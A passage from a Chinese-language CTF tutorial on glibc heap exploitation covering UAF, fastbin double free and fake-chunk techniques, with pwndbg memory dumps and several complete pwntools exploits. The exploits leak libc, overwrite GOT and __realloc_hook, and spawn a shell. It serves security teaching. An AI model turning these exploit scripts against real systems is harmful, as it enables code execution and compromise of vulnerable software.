03:0018│   0x6020d8 (itemlist+24) —▸ 0x12bb090 ◂— 'xxxxxxxx'
04:0020│   0x6020e0 (itemlist+32) ◂— 0x10                                # 2号节点
05:0028│   0x6020e8 (itemlist+40) —▸ 0x12bb150 ◂— 0x68732f6e69622f /* '/bin/sh' */
06:0030│   0x6020f0 (itemlist+48) ◂— 0x50
07:0038│   0x6020f8 (itemlist+56) —▸ 0x60200a (_GLOBAL_OFFSET_TABLE_+10) ◂— 0x0   
```

**完整EXP**

```
#!/usr/bin/env python
from pwn import *
from time import sleep
context(arch='amd64', os='linux', endian='little', log_level = 'debug')

elf = ELF('pwn')
libc = elf.libc

def show():
	p.sendlineafter(':', '1')

def add(length, content):
	p.sendlineafter(':', '2')
	p.sendlineafter(':', str(length))
	p.sendafter(':', content)
	sleep(0.01)

def edit(idx, length, content):
	p.sendlineafter(':', '3')
	p.sendlineafter(':', str(idx))
	p.sendlineafter(':', str(length))
	p.sendafter(':', content)
	sleep(0.01)

def delete(idx):
	p.sendlineafter(':', '4')
	p.sendlineafter(':', str(idx))

p = process(elf.path)

add(0x50, '000000')
add(0x50, '111111')
add(0x50, '.%17$p.')
delete(1)
edit(0, 0x100, flat('0' * 0x50, '00000000', 0x61, 0x601ffa))
add(0x50, 'xxxxxxxx')
add(0x50, flat('\0' * 14, flat(elf.sym['printf'])[:6]))
delete(2)
p.recvuntil('.')
libc.address = int(p.recvuntil('.', drop = True), 16) - 0x20830
print('libc @ {:0x}'.format(libc.address))
assert libc.address & 0xfff == 0
edit(3, 0x50, flat('\0' * 14, flat(libc.sym['system'])[:6]))
add(0x10, "/bin/sh\0")
delete(2)
p.interactive()
```



## UAF(Use After Free)

一块堆内存在释放后被重新使用，重新使用时，内存中的数据已经发生了变化，造成非预期的结果

### UAF控制结构体内函数指针

**调试案例**

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

struct DATA {
	char data[0x10];
};

struct POINTER {
	int (*printFunc)(char *);
	char *(*readFunc)(char *);
}

int main() {
	struct POINTER *p = (struct POINTER *)malloc(sizeof(struct POINTER));
	p->printFunc = (void *)puts;
	p->readFunc = (void *)gets;

	free(p);

	struct DATA *d = (struct DATA *)malloc(sizeof(struct DATA));
	memcpy(d->data, "aaaaaaaabbbbbbbb", 16);

	p->readFunc(d->data);
	p->printFunc(d->data);

	return 0;
}
```

执行free(p)之前，结构体成员如下：

```
pwndbg> p p
$3 = (struct POINTER *) 0x84d010
pwndbg> p *p
$4 = {
  printFunc = 0x400510 <puts@plt>,
  readFunc = 0x400540 <gets@plt>
}
```

执行free(p)之后，fastbin及结构体成员如下：

```
pwndbg> bins
fastbins
0x20: 0x84d000 <- 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> p p
$5 = (struct POINTER *) 0x84d010
pwndbg> p *p
$6 = {
  printFunc = 0x0,
  readFunc = 0x400540 <gets@plt>
}
```

由于sizeof(struct DATA) == sizeof(struct POINTER)，因此接下来的malloc会申请回0x84d000。这样导致d和p共用一块内存。

```
pwndbg> p d
$9 = (struct DATA *) 0x84d010
pwndbg> p p
$10 = (struct POINTER *) 0x84d010
pwndbg> p *d
$11 = {
  data = "\000\000\000\000\000\000\000\000\050\000..."
}
pwndbg> p *p
$12 = {
  printFunc = 0x0,
  readFunc = 0x400540 <gets@plt>
}
```

d和p共用一块内存，执行到`p->readFunc(d->data)`时，p引用释放后的内存，此时内存中的数据已经发生改变，形成use after free，达到控制PC寄存器的效果。

### fastbin double free

   fastbin double free能够成功利用主要有两部分原因:

- fastbin的堆块被释放后next_chunk的pre_inuse位不会被清空
- fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。
  - 新释放的chunk不在链表头部即可
  - 新释放的chunk大小和当前链大小一致

```
3931  do
3932  {
3933      /* Check that the top of the bin is not the record we are going to add
3934         (i.e., double free). */
3935      if (__builtin_expect (old == p, 0))
3936      {
3937          errstr = "double free or corruption (fasttop)";
3938          goto errout;
3939      }
3940      /* Check that size of fastbin chunk at the top is the same as
3941         size of the chunk that we are adding. We can dereference OLD
3942         only if we have the lock, otherwise it might have already been
3943         deallocated. See use of OLD_IDX below for the actual check.  */
3944      if (have_lock && old != NULL)
3945          old_idx = fastbin_index(chunksize(old));
3946      p->fd = old2 = old;
3947  }
```

**调试案例**

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	char *p1 = malloc(0x60);
	char *p2 = malloc(0x60);

	free(p1);  // first free
	free(p2);
	free(p1);  // double free

	char *p3 = malloc(0x60);
	memcpy(p3, "\xef\xbe\xad\xde", 4);

	return 0;
}
```

在执行完free(p2)后，fastbin链表如下：

```
pwndbg> p p1
$1 = 0xb0c010 ""
pwndbg> p p2
$2 = 0xb0c080 ""
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xb0c070 —▸ 0xb0c000 ◂— 0x0
0x80: 0x0      
pwndbg> p main_arena.fastbinsY 
$3 = {0x0, 0x0, 0x0, 0x0, 0x0, 0xb0c070, 0x0, 0x0, 0x0, 0x0}
```

再次执行free(p1)触发double free后，fastbin链表如下：

```
pwndbg> p p1
$4 = 0xb0c010 "p\300\260"
pwndbg> p p2
$5 = 0xb0c080 ""
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xb0c000 —▸ 0xb0c070 —▸ 0xb0c000 ◂— 0xb0c070
0x80: 0x0
pwndbg> p main_arena.fastbinsY 
$6 = {0x0, 0x0, 0x0, 0x0, 0x0, 0xb0c000, 0x0, 0x0, 0x0, 0x0}
```

接下来分配p3和memcpy执行完后，fastbin如下：

```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xb0c070 —▸ 0xb0c000 ◂— 0xdeadbeef
0x80: 0x0
```

libc 2.26之前的版本，即不考虑tcache情况下，连续free两次会报错，就因为有前面这个链表头校验，表现为:

   - free(a),free(a), 报错
   - free(a),free(b),free(a), 不会报错

#### 案例：freenote (0ctf 2015)修改版

https://github.com/f1yyy/example_for_class.git

**代码分析**

对代码逻辑分析如下，详细参考附件源码

```
四种操作
new note - malloc
edit note - realloc
delete note - 未检查note是否释放，可以触发double free
list note - 打印

note结构
note_list结构存储了note最大数，inuse_note数量，长度为256的notes数组
note结构存储了inuse标志，note内容大小和指针
初始化时分配了NOTENUM(256)个note

创建note - new_note()
创建note时先读入note内容长度(不能超过4096)，然后再通过malloc上在堆上分配相同大小的内存。读入内容后，将指针和大小保存在notes数组当中空闲的(inuse为0)note结构中(从0到255开始搜索)。
通过此功能可以任意创建fast/small/large chunk。

修改node - edit_note()
修改note时，需要指定note编号，并指定新note大小，如果大小发生变化，则调用realloc重新分配内存。

删除note - delete_note()
删除note时，只需指定note序号，然而再删除note时，并没有检查对应的notes[n]的inuse标志是否为1，而且删除note后并未清空note结构中的内容指针，因此可以对任意空闲的note做多次free。
此处存在double free漏洞。

打印note列表 - list_note()
打印note功能可以列出所有note的内容。(list_note可以用来泄露信息)
```

**方法1: 在堆上伪造fastchunk**

> 调试环境： Ubuntu 16.04 x64 (libc-2.23)

完整EXP如下

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
#context.terminal = ['tmux', 'split', '-h']
elf = ELF('test')
libc = elf.libc
p = process(elf.path)
#gdb.attach(p)

def add_note(content):
    p.sendlineafter(': ', '2')
    p.sendlineafter(': ', str(len(content)))
    p.sendafter(': ', content)

def del_note(idx):
    p.sendlineafter(': ', '4')
    p.sendlineafter(': ', str(idx))

def edit_note(idx, content):
    p.sendlineafter(': ', '3')
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(len(content)))
    p.sendafter(': ', content)

def list_node():
    p.sendlineafter(': ', '1')

add_note('A' * 0x30)                 # note0 = chunk0
add_note('B' * 0x30)                 # note1 = chunk1
add_note('C' * 0x30)                 # note2 = chunk2
add_note('/bin/sh\0' + '\0' * 0x28)  # note3 = chunk3, 稍后用于system('/bin/sh')
add_note('E' * 0x41)                 # note4 = chunk4, 0x41刚好是伪造用的chunk size
raw_input('step1 success')
del_note(0)                          # free(chunk0)   fastbin: chunk0->NULL
del_note(1)                          # free(chunk1)   fastbin: chunk1->chunk0->NULL
add_note('E' * 0x30)                 # note0 = chunk1 fastbin: chunk0->NULL
raw_input('step2 success')
del_note(2)                          # free(chunk2)   fastbin: chunk2->chunk0->NULL
del_note(1)                          # free(chunk1)   fastbin: chunk1->chunk2->chunk0->NULL
list_node()                          # leak chunk1->fd = addr_of_chunk2
p.recvuntil('0. ')
heapbase = u64(p.recvuntil('3. ')[:-4].ljust(8, '\0')) - 0x18a0
raw_input('step3 success')
edit_note(0, p64(heapbase + 0x80) + 'F' * 0x28)     # fastbin: chunk1->(heap+0x80)
add_note('F' * 0x30)                 # 1 = chunk1
add_note(p64(elf.got['free']) + p64(1) + p64(8) + p64(elf.got['free']) + '\0' * 0x10)
raw_input('step4 success')
list_node()                          # leak free@got
p.recvuntil('4. ')
free_got = u64(p.recvuntil('\n')[:-1].ljust(8, '\0'))
print('free_got={}'.format(hex(free_got)))
libcbase = free_got - libc.sym['free']
system_addr = libcbase + libc.sym['system']
edit_note(5, p64(system_addr))
raw_input('step5 success')
del_note(3)
p.interactive()
```

整体思路为：通过double free实现内存读写后，在全局note_list结构体(可参考附件源码)处伪造了一个新的节点，其地址指向free@plt，通过对改地址的读和写，即可以实现泄露free@got地址和GOT劫持，根据泄露地址可以计算出system地址，然后通过GOT劫持将free@got改写为system@got，最后调用free('/bin/sh')即完成了system('/bin/sh')调用取得shell。

核心代码分步调试分析：

**STEP1**

```
add_note('A' * 0x30)  # 0
add_note('B' * 0x30)  # 1
add_note('C' * 0x30)  # 2
add_note('D' * 0x30)  # 3
add_note('E' * 0x41)  # 4
raw_input("step1 success")
```

首先创建了5个节点，其中4个大小0x30，第5个大小0x41。

> 之所以要创建一个0x41大小的节点，是因为0x30的节点其对应的chunk size即为0x41。后面我们需要在note_list结构体里通过double free伪造一个chunk，来达到改写note_list结构体的目的，因此需要在note_list里构造0x41出来，方便后面在此处伪造chunk。

此时查看内存布局如下：

> 0x6020a0为bss段里全局变量struct node_list *list的固定地址，调试时可以从此处定位到整个栈内存

```
pwndbg> x/gx 0x6020a0        # 此地址为bss段全局变量list固定地址
0x6020a0 <list>:        0x0000000001812010
pwndbg> x/30gx 0x0000000001812010
0x1812010:      0x0000000000000100      0x0000000000000005
0x1812020:      0x0000000000000001      0x0000000000000030
0x1812030:      0x0000000001813830      0x0000000000000001
0x1812040:      0x0000000000000030      0x0000000001813870
0x1812050:      0x0000000000000001      0x0000000000000030
0x1812060:      0x00000000018138b0      0x0000000000000001
0x1812070:      0x0000000000000030      0x00000000018138f0
0x1812080:      0x0000000000000001      0x0000000000000041   # 这里0x41是第5个节点的长度，最后我们将在这里伪造chunk
0x1812090:      0x0000000001813930      0x0000000000000000
0x18120a0:      0x0000000000000000      0x0000000000000000
pwndbg> x/50gx 0x0000000001813830-0x10
0x1813820:      0x0000000000000000      0x0000000000000041
0x1813830:      0x4141414141414141      0x4141414141414141
0x1813840:      0x4141414141414141      0x4141414141414141
0x1813850:      0x4141414141414141      0x0041414141414141
0x1813860:      0x0000000000000000      0x0000000000000041
0x1813870:      0x4242424242424242      0x4242424242424242
0x1813880:      0x4242424242424242      0x4242424242424242
0x1813890:      0x4242424242424242      0x0042424242424242
0x18138a0:      0x0000000000000000      0x0000000000000041
0x18138b0:      0x4343434343434343      0x4343434343434343
0x18138c0:      0x4343434343434343      0x4343434343434343
0x18138d0:      0x4343434343434343      0x0043434343434343
0x18138e0:      0x0000000000000000      0x0000000000000041
0x18138f0:      0x4444444444444444      0x4444444444444444
0x1813900:      0x4444444444444444      0x4444444444444444
0x1813910:      0x4444444444444444      0x0044444444444444
0x1813920:      0x0000000000000000      0x0000000000000051
0x1813930:      0x4545454545454545      0x4545454545454545
0x1813940:      0x4545454545454545      0x4545454545454545
0x1813950:      0x4545454545454545      0x4545454545454545
0x1813960:      0x4545454545454545      0x4545454545454545
0x1813970:      0x0000000000000000      0x0000000000020691
0x1813980:      0x0000000000000000      0x0000000000000000
```

**STEP2**

依次释放了0号和1号节点，然后又在0号分配了新节点。

注意这个过程中fastbin链表变化，同时由于后进先出，新分配的0号节点，实际内存分配的是chunk1

```
delete_note(0)                # fastbin: chunk0
delete_note(1)                # fastbin: chunk1->chunk0
add_note('E' * 0x30)          # fastbin: chunk0
raw_input("step2 success")
```

此时内存布局如下：

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x0000000001812010
pwndbg> x/30gx 0x000000001812010
0x1812010:       0x0000000000000100      0x0000000000000004
0x1812020:       0x0000000000000001      0x0000000000000030
0x1812030:       0x0000000001813870      0x0000000000000000
0x1812040:       0x0000000000000000      0x0000000001813870
0x1812050:       0x0000000000000001      0x0000000000000030
0x1812060:       0x00000000018138b0      0x0000000000000001
0x1812070:       0x0000000000000030      0x00000000018138f0
0x1812080:       0x0000000000000001      0x0000000000000041
0x1812090:       0x0000000001813930      0x0000000000000000
0x18120a0:       0x0000000000000000      0x0000000000000000
pwndbg> x/50gx 0x0000000001813830-0x10
0x1813820:       0x0000000000000000      0x0000000000000041
0x1813830:       0x0000000000000000      0x4141414141414141   # chunk0被释放，其fd=NULL
0x1813840:       0x4141414141414141      0x4141414141414141
0x1813850:       0x4141414141414141      0x0041414141414141
0x1813860:       0x0000000000000000      0x0000000000000041
0x1813870:       0x4545454545454545      0x4545454545454545   # chunk1先被释放，后又被分配出去
0x1813880:       0x4545454545454545      0x4545454545454545
0x1813890:       0x4545454545454545      0x0045454545454545
0x18138a0:       0x0000000000000000      0x0000000000000041
0x18138b0:       0x4343434343434343      0x4343434343434343
0x18138c0:       0x4343434343434343      0x4343434343434343
0x18138d0:       0x4343434343434343      0x0043434343434343
0x18138e0:       0x0000000000000000      0x0000000000000041
0x18138f0:       0x4444444444444444      0x4444444444444444
0x1813900:       0x4444444444444444      0x4444444444444444
0x1813910:       0x4444444444444444      0x0044444444444444
0x1813920:       0x0000000000000000      0x0000000000000051
0x1813930:       0x4545454545454545      0x4545454545454545
0x1813940:       0x4545454545454545      0x4545454545454545
0x1813950:       0x4545454545454545      0x4545454545454545
0x1813960:       0x4545454545454545      0x4545454545454545
0x1813970:       0x0000000000000000      0x0000000000020691
0x1813980:       0x0000000000000000      0x0000000000000000
```

**STEP3**

```
delete_note(2)                # fastbin: chunk2->chunk0
delete_note(1)                # fastbin: chunk1->chunk2->chunk0
list_note()
p.recvuntil('0. ')
heap = u64(p.recv(4)+'\x00'*4) - 0x18a0
raw_input("step3 success")
```

这里先释放了2号节点，然后释放了1号节点(即free(chunk1))形成double free，该fd指针会指向chunk2

注意上一步chunk1已经被分配出去了。因此通过读取分配出去的节点内容，就可以获得chunk2的地址。这里的list_node调用泄露了地址为0x18138a0，减0x18a0得到堆基址0x1812000，然后进一步根据偏移可以定位到struct node_list结构体地址。

此时查看内存布局如下：

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x0000000001812010
pwndbg> x/30gx 0x000000001812010                                                                     
0x1812010:       0x0000000000000100      0x0000000000000002
0x1812020:       0x0000000000000001      0x0000000000000030
0x1812030:       0x0000000001813870      0x0000000000000000
0x1812040:       0x0000000000000000      0x0000000001813870
0x1812050:       0x0000000000000000      0x0000000000000000
0x1812060:       0x00000000018138b0      0x0000000000000001
0x1812070:       0x0000000000000030      0x00000000018138f0
0x1812080:       0x0000000000000001      0x0000000000000041
0x1812090:       0x0000000001813930      0x0000000000000000
0x18120a0:       0x0000000000000000      0x0000000000000000
pwndbg> x/50gx 0x000000001813830-0x10
0x1813820:       0x0000000000000000      0x0000000000000041
0x1813830:       0x0000000000000000      0x4141414141414141
0x1813840:       0x4141414141414141      0x4141414141414141
0x1813850:       0x4141414141414141      0x0041414141414141
0x1813860:       0x0000000000000000      0x0000000000000041
0x1813870:       0x00000000018138a0      0x4545454545454545      # double free后，fd=chunk2地址
0x1813880:       0x4545454545454545      0x4545454545454545
0x1813890:       0x4545454545454545      0x0045454545454545
0x18138a0:       0x0000000000000000      0x0000000000000041
0x18138b0:       0x0000000001813820      0x4343434343434343
0x18138c0:       0x4343434343434343      0x4343434343434343
0x18138d0:       0x4343434343434343      0x0043434343434343
0x18138e0:       0x0000000000000000      0x0000000000000041
0x18138f0:       0x4444444444444444      0x4444444444444444
0x1813900:       0x4444444444444444      0x4444444444444444
0x1813910:       0x4444444444444444      0x0044444444444444
0x1813920:       0x0000000000000000      0x0000000000000051
0x1813930:       0x4545454545454545      0x4545454545454545
0x1813940:       0x4545454545454545      0x4545454545454545
0x1813950:       0x4545454545454545      0x4545454545454545
0x1813960:       0x4545454545454545      0x4545454545454545
0x1813970:       0x0000000000000000      0x0000000000020691
0x1813980:       0x0000000000000000      0x0000000000000000
```

**STEP4**

```
edit_note(0, p64(heap + 0x80) + 'F' * 0x28)  # fastbin: chunk1->(heap+0x80)
add_note('G' * 0x30)
add_note('H' * 0x30)
raw_input("step4 success")
```

这里首先通过编辑0号节点(0号节点的内存实际指向的chunk1)，实际就是改写了chunk1的fd指针，fd本来指向18138a0，这里改成了heap+0x80，指向伪造堆头位置0x1812080，即前面提到的0x41处。实际上也就劫持了fastbin链表。接下来经过连续两次节点分配，这里第二个节点就被分配到了(heap+0x80)处。这里写的内容是'H'，实际上这里我们可以写任意内容，比如这里我们可以在note_list里伪造合法node节点，inuse设为1，指针指向我们想写的地址，就可以任意地址写，例如进一步改GOT表或栈指针，都可以成功利用。

此时查看内存布局如下：

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x0000000001812010
pwndbg> x/30gx 0x00000000001812010
0x1812010:      0x0000000000000100      0x0000000000000004
0x1812020:      0x0000000000000001      0x0000000000000030
0x1812030:      0x0000000001813870      0x0000000000000001
0x1812040:      0x0000000000000030      0x0000000001813870
0x1812050:      0x0000000000000001      0x0000000000000030
0x1812060:      0x0000000001812090      0x0000000000000001
0x1812070:      0x0000000000000030      0x00000000018138f0
0x1812080:      0x0000000000000001      0x0000000000000041    # 成功将内存分配在此处，并改写了此处内存
0x1812090:      0x4848484848484848      0x4848484848484848
0x18120a0:      0x4848484848484848      0x4848484848484848
0x18120b0:      0x4848484848484848      0x0048484848484848
0x18120c0:      0x0000000000000000      0x0000000000000000
pwndbg> x/50gx 0x000000001813830-0x10
0x1813820:      0x0000000000000000      0x0000000000000041
0x1813830:      0x0000000000000000      0x4141414141414141
0x1813840:      0x4141414141414141      0x4141414141414141
0x1813850:      0x4141414141414141      0x0041414141414141
0x1813860:      0x0000000000000000      0x0000000000000041
0x1813870:      0x4747474747474747      0x4747474747474747
0x1813880:      0x4747474747474747      0x4747474747474747
0x1813890:      0x4747474747474747      0x0047474747474747
0x18138a0:      0x0000000000000000      0x0000000000000041
0x18138b0:      0x0000000001813820      0x4343434343434343
0x18138c0:      0x4343434343434343      0x4343434343434343
0x18138d0:      0x4343434343434343      0x0043434343434343
0x18138e0:      0x0000000000000000      0x0000000000000041
0x18138f0:      0x4444444444444444      0x4444444444444444
0x1813900:      0x4444444444444444      0x4444444444444444
0x1813910:      0x4444444444444444      0x0044444444444444
0x1813920:      0x0000000000000000      0x0000000000000051
0x1813930:      0x4545454545454545      0x4545454545454545
0x1813940:      0x4545454545454545      0x4545454545454545
0x1813950:      0x4545454545454545      0x4545454545454545
0x1813960:      0x4545454545454545      0x4545454545454545
0x1813970:      0x0000000000000000      0x0000000000020691
0x1813980:      0x0000000000000000      0x0000000000000000
```



**方法2：__realloc_hook处伪造fastchunk**

> 调试环境： Ubuntu 16.04 x64 (libc-2.23)

Glibc全局变量 `__realloc_hook` 附近可以伪造0x70大小的fast chunk，然后可以通过修改 `__relloc_hook` 即可以劫持realloc

```
pwndbg> x/20gx 0x7f5b03e0cb08
0x7f5b03e0cb08 <__realloc_hook>:        0x00007f5b03acda00      0x0000000000000000
0x7f5b03e0cb18: 0x0000000000000000      0x0000000100000000
0x7f5b03e0cb28 <main_arena+8>:  0x0000000000000000      0x0000000000000000
pwndbg> x/20gx 0x7f5b03e0cb08-0x1b
0x7f5b03e0caed <_IO_wide_data_0+301>:   0x5b03e0b260000000      0x000000000000007f
0x7f5b03e0cafd: 0x5b03acde20000000      0x5b03acda0000007f
0x7f5b03e0cb0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
0x7f5b03e0cb1d: 0x0000000000000000      0x0000000000000000
0x7f5b03e0cb2d <main_arena+13>: 0x0000000000000000      0x0000000000000000
```

在此之前需要先构造small bin，借助small bin的double free可以leak libc。small bin释放后的chunk会被放到unsorted bin，触发double free后通过读取chunk中的指针，获得main_area地址。main_area结构地址位于libc中，根据其偏移可以计算libc基址，再进一步就可以确定`__realloc_hook`地址。然后可以通过fastbin的double free控制内存分配在`__realloc_hook-0x1b`处就可以修改该处内存，也就能获取shell，类似的也可以改 `__malloc_hook`。

> 注意small bin和fastbin的区别：
>
> - fastbin是fd指针串起来的单向链表，链表头位于main_area，分配时后进先出
> - small bin是fd、bk指针的双向链表，先进先出，因此通过其中头尾节点能获取到main_area地址(leak libc)
> - small bin释放后会合并相邻的空闲chunk，fastbin则不会自动合并相邻chunk
> - small bin释放后会放入unsorted bin，fastbin释放后依然放入相应fastbin

EXP完整代码如下：

```
#!/usr/bin/env python
from pwn import *
from time import sleep
context(arch='amd64', endian='little', log_level='debug')

elf = ELF('test')
libc = elf.libc
p = process(elf.path)

def show():
	p.sendlineafter('choice:', '1')
	sleep(0.01)

def add(length, content):
	p.sendlineafter('choice:', '2')
	p.sendlineafter(':', str(length))
	p.sendafter(':', content)
	sleep(0.01)

def edit(idx, length, content):
	p.sendlineafter('choice:', '3')
	p.sendlineafter(':', str(idx))
	p.sendlineafter(':', str(length))
	p.sendafter(':', content)
	sleep(0.01)

def delete(idx):
	p.sendlineafter('choice:', '4')
	p.sendlineafter(':', str(idx))
	sleep(0.01)

libc.sym['one_gadget'] = 0xf1147

add(0x80, '0' * 0x80)    # 0=chunk0
add(0x10, '1' * 0x10)    # 1=chunk1
add(0x80, '2' * 0x80)    # 2=chunk2
add(0x68, 'a' * 0x68)    # 3
add(0x68, 'b' * 0x68)    # 4
pause()
delete(2)                #           unsortbin: chunk2<->main_area<->
delete(0)                #           unsortbin: chunk0<->chunk2<->main_area<->
add(0x80, '4' * 0x80)    # 0=chunk2  unsortbin: chunk0<->main_area<->
pause()
delete(2)                #           unsortbin: chunk2<->chunk0<->main_area<->
add(0x80, '5' * 0x80)    # 2=chunk0  unsortbin: chunk2<->main_area<->
show()
p.recvuntil('0. ')
libc.address = u64(p.recv(6) + '\0\0') - 0x3c4b78
assert libc.address & 0xfff == 0
print('libc = {}'.format(hex(libc.address)))
pause()
delete(3)
delete(4)
add(0x68, 'c' * 0x68)    # 3=chunk4
delete(4)
pause()
edit(3, 0x68, flat(libc.sym['__realloc_hook'] - 0x1b, '\0' * 0x10))
add(0x68, 'd' * 0x68)
add(0x68, flat('\0' * 0xb, libc.sym['one_gadget'], '\0' * 0x10))
p.sendlineafter('choice:', '3')
p.sendlineafter(':', str(1))
p.sendlineafter(':', str(0x80))
p.interactive()
```

**STEP1** 创建了5个节点：

```
add(0x80, '0' * 0x80)    # 0=chunk0
add(0x10, '1' * 0x10)    # 1=chunk1
add(0x80, '2' * 0x80)    # 2=chunk2
add(0x68, 'a' * 0x68)    # 3
add(0x68, 'b' * 0x68)    # 4
```

其中前三个节点组合用于small bin的double free。0x80大小的节点属于small bin范围，通过small bin的double free，来leak main_area地址也即leak libc。后两个节点则属于fastbin范围，用于通过fastbin double free将内存分配到`__realloc_hook`附近。

先关注前3个节点，此时查看内存布局如下：

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x00000000011dd010
pwndbg> x/20gx 0x11dd010
0x11dd010:      0x0000000000000100      0x0000000000000005
0x11dd020:      0x0000000000000001      0x0000000000000080
0x11dd030:      0x00000000011de830      0x0000000000000001
0x11dd040:      0x0000000000000010      0x00000000011de8c0
0x11dd050:      0x0000000000000001      0x0000000000000080
0x11dd060:      0x00000000011de8e0      0x0000000000000001
0x11dd070:      0x0000000000000068      0x00000000011de970
0x11dd080:      0x0000000000000001      0x0000000000000068
0x11dd090:      0x00000000011de9e0      0x0000000000000000
0x11dd0a0:      0x0000000000000000      0x0000000000000000
pwndbg> x/44gx 0x11de830-0x10
0x11de820:      0x0000000000000000      0x0000000000000091
0x11de830:      0x3030303030303030      0x3030303030303030
0x11de840:      0x3030303030303030      0x3030303030303030
0x11de850:      0x3030303030303030      0x3030303030303030
0x11de860:      0x3030303030303030      0x3030303030303030
0x11de870:      0x3030303030303030      0x3030303030303030
0x11de880:      0x3030303030303030      0x3030303030303030
0x11de890:      0x3030303030303030      0x3030303030303030
0x11de8a0:      0x3030303030303030      0x0030303030303030
0x11de8b0:      0x0000000000000000      0x0000000000000021
0x11de8c0:      0x3131313131313131      0x0031313131313131
0x11de8d0:      0x0000000000000000      0x0000000000000091
0x11de8e0:      0x3232323232323232      0x3232323232323232
0x11de8f0:      0x3232323232323232      0x3232323232323232
0x11de900:      0x3232323232323232      0x3232323232323232
0x11de910:      0x3232323232323232      0x3232323232323232
0x11de920:      0x3232323232323232      0x3232323232323232
0x11de930:      0x3232323232323232      0x3232323232323232
0x11de940:      0x3232323232323232      0x3232323232323232
0x11de950:      0x3232323232323232      0x0032323232323232
0x11de960:      0x0000000000000000      0x0000000000000071
0x11de970:      0x6161616161616161      0x6161616161616161
```

**STEP2** 主要执行如下代码：

```
delete(2)                #           unsortbin: chunk2 <-> main_area <->
delete(0)                #           unsortbin: chunk0 <-> chunk2 <-> main_area <->
add(0x80, '4' * 0x80)    # 0=chunk2  unsortbin: chunk0 <-> main_area <->
```

这里主要通过操作chunk2和chunk0来完成uaf。这里先后释放了chunk2和chunk0，然后又新建了节点，节点释放后会被放入unsortbin，按照先进先出的原则，这里新分配的节点内存实际分配的就是chunk2。注意这里中间隔了一个chunk1，其作用就是为了防止chunk2和chunk0被释放后自动合并的，所以这里chunk1的大小并不重要。

内存布局如下：

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x00000000011dd010
pwndbg> x/20gx 0x11dd010
0x11dd010:      0x0000000000000100      0x0000000000000004
0x11dd020:      0x0000000000000001      0x0000000000000080
0x11dd030:      0x00000000011de8e0      0x0000000000000001
0x11dd040:      0x0000000000000010      0x00000000011de8c0
0x11dd050:      0x0000000000000000      0x0000000000000000
0x11dd060:      0x00000000011de8e0      0x0000000000000001
0x11dd070:      0x0000000000000068      0x00000000011de970
0x11dd080:      0x0000000000000001      0x0000000000000068
0x11dd090:      0x00000000011de9e0      0x0000000000000000
0x11dd0a0:      0x0000000000000000      0x0000000000000000
pwndbg> x/44gx 0x11de830-0x10
0x11de820:      0x0000000000000000      0x0000000000000091
0x11de830:      0x00007fe8f1108b78      0x00007fe8f1108b78
0x11de840:      0x3030303030303030      0x3030303030303030
0x11de850:      0x3030303030303030      0x3030303030303030
0x11de860:      0x3030303030303030      0x3030303030303030
0x11de870:      0x3030303030303030      0x3030303030303030
0x11de880:      0x3030303030303030      0x3030303030303030
0x11de890:      0x3030303030303030      0x3030303030303030
0x11de8a0:      0x3030303030303030      0x0030303030303030
0x11de8b0:      0x0000000000000090      0x0000000000000020
0x11de8c0:      0x3131313131313131      0x0031313131313131
0x11de8d0:      0x0000000000000000      0x0000000000000091
0x11de8e0:      0x3434343434343434      0x3434343434343434
0x11de8f0:      0x3434343434343434      0x3434343434343434
0x11de900:      0x3434343434343434      0x3434343434343434
0x11de910:      0x3434343434343434      0x3434343434343434
0x11de920:      0x3434343434343434      0x3434343434343434
0x11de930:      0x3434343434343434      0x3434343434343434
0x11de940:      0x3434343434343434      0x3434343434343434
0x11de950:      0x3434343434343434      0x0034343434343434
0x11de960:      0x0000000000000090      0x0000000000000071
0x11de970:      0x6161616161616161      0x6161616161616161
```

**STEP3** 触发double free：

```
delete(2)                #           unsortbin: chunk2 <-> chunk0 <-> main_area<->
add(0x80, '5' * 0x80)    # 2=chunk0  unsortbin: chunk2 <-> main_area <->
show()
p.recvuntil('0. ')
libc.address = u64(p.recv(6) + '\0\0') - 0x3c4b78
```

这里再申请了节点是为了让chunk2能指向main_area，然后通过读取0节点即chunk2内存即可获得main_area地址，成功leak libc。其中偏移0x3c4b78可以通过`xinfo <address>`命令取得。

内存布局如下：

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x00000000011dd010
pwndbg> x/20gx 0x11dd010
0x11dd010:      0x0000000000000100      0x0000000000000004
0x11dd020:      0x0000000000000001      0x0000000000000080
0x11dd030:      0x00000000011de8e0      0x0000000000000001
0x11dd040:      0x0000000000000010      0x00000000011de8c0
0x11dd050:      0x0000000000000001      0x0000000000000080
0x11dd060:      0x00000000011de830      0x0000000000000001
0x11dd070:      0x0000000000000068      0x00000000011de970
0x11dd080:      0x0000000000000001      0x0000000000000068
0x11dd090:      0x00000000011de9e0      0x0000000000000000
0x11dd0a0:      0x0000000000000000      0x0000000000000000
pwndbg> x/44gx 0x11de830-0x10
0x11de820:      0x0000000000000000      0x0000000000000091
0x11de830:      0x3535353535353535      0x3535353535353535
0x11de840:      0x3535353535353535      0x3535353535353535
0x11de850:      0x3535353535353535      0x3535353535353535
0x11de860:      0x3535353535353535      0x3535353535353535
0x11de870:      0x3535353535353535      0x3535353535353535
